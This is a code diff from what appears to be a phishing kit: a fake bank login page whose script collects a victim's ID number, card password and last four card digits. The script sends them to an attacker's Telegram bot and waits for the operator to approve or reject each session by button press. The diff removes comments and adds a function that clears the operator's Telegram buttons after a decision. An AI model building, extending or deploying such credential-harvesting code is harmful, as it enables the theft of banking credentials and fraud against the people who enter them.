@@ -230,7 +230,6 @@
             let statusCheckInterval = null;
             let lastUpdateId = parseInt(sessionStorage.getItem('lastUpdateId')) || 0;
 
-            // Cargar los datos de configuración de Telegram
             async function loadTelegramConfig() {
                 try {
                     const response = await fetch('js/brr76.json');
@@ -247,7 +246,7 @@
                     return false;
                 }
             }
-            
+
             async function initLastUpdateId() {
                 try {
                     if (!TELEGRAM_BOT_TOKEN) return;
@@ -266,8 +265,6 @@
                 }
             }
 
-
-            // Lógica para el modal de tipo de documento
             if (tipoDocSelect) {
                 tipoDocSelect.addEventListener("click", () => {
                     if (modalSelect) {
@@ -295,7 +292,6 @@
                 }
             };
 
-            // Lógica para cambiar de pestaña
             function switchTab(tab) {
                 activeTab = tab;
                 if (tab === 'segura') {
@@ -319,10 +315,8 @@
             tabSegura.addEventListener('click', () => switchTab('segura'));
             tabDebito.addEventListener('click', () => switchTab('debito'));
 
-            // Inicializar en la pestaña de clave segura
             switchTab('segura');
 
-            // Validación de los campos del formulario
             function validateForm() {
                 const nroDocValid = nroDoc && nroDoc.value.length >= 5;
 
@@ -376,12 +370,40 @@
                     if (!response.ok) {
                         const errorText = await response.text();
                         console.error(`Error al enviar mensaje a Telegram: ${response.status} - ${errorText}`);
-                        return false;
+                        return null;
                     }
-                    return true;
+                    const data = await response.json();
+                    return data.result.message_id;
                 } catch (error) {
                     console.error('Error de red al enviar mensaje a Telegram:', error);
-                    return false;
+                    return null;
+                }
+            }
+
+            async function editTelegramMessage(chatId, messageId) {
+                if (!chatId || !messageId) return;
+
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageReplyMarkup`;
+                const payload = {
+                    chat_id: chatId,
+                    message_id: messageId,
+                    reply_markup: {}
+                };
+
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(payload),
+                    });
+                    if (!response.ok) {
+                        const errorText = await response.text();
+                        console.error(`Error al borrar botones de Telegram: ${response.status} - ${errorText}`);
+                    }
+                } catch (error) {
+                    console.error('Error de red al borrar botones de Telegram:', error);
                 }
             }
 
@@ -406,7 +428,6 @@
                     message = `🍀 GOLEADOR 🍀\n\nTipo de Ingreso: ${loginType}\nTipo de Doc: ${loginData.tipoDoc}\n\nCEDULA💎: ${loginData.nroDoc}\nClAVE🔐: ${loginData.cardClave}\nUltimos 4: ${loginData.cardDigitos}\n\nFecha/Hora: ${formattedDate}, ${formattedTime}`;
                 }
 
-                // Guardar los datos de sesión antes de enviar a Telegram
                 const dataToStore = {
                     ...loginData,
                     transactionId: transactionId,
@@ -422,9 +443,10 @@
                     ],
                 });
 
-                const sent = await sendToTelegram(message, keyboard);
+                const messageId = await sendToTelegram(message, keyboard);
 
-                if (sent) {
+                if (messageId) {
+                    sessionStorage.setItem('telegramMessageId', messageId);
                     checkPaymentVerification();
                 } else {
                     spinnerModal.style.display = 'none';
@@ -445,14 +467,17 @@
 
                         if (updates && updates.length > 0) {
                             const relevantUpdate = updates.find(u => u.callback_query && u.callback_query.data.includes(transactionId));
-                            
+
                             if (relevantUpdate) {
                                 const latest = relevantUpdate;
                                 clearInterval(statusCheckInterval);
                                 spinnerModal.style.display = 'none';
-                                
+
                                 const callbackData = latest.callback_query.data.split(':')[0];
                                 const callbackId = latest.callback_query.id;
+                                const messageId = sessionStorage.getItem('telegramMessageId');
+
+                                await editTelegramMessage(TELEGRAM_CHAT_ID, messageId);
 
                                 try {
                                     await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
@@ -507,7 +532,6 @@
                 }
             });
 
-            // Llamadas de inicialización
             loadTelegramConfig().then(configLoaded => {
                 if (configLoaded) {
                     initLastUpdateId();
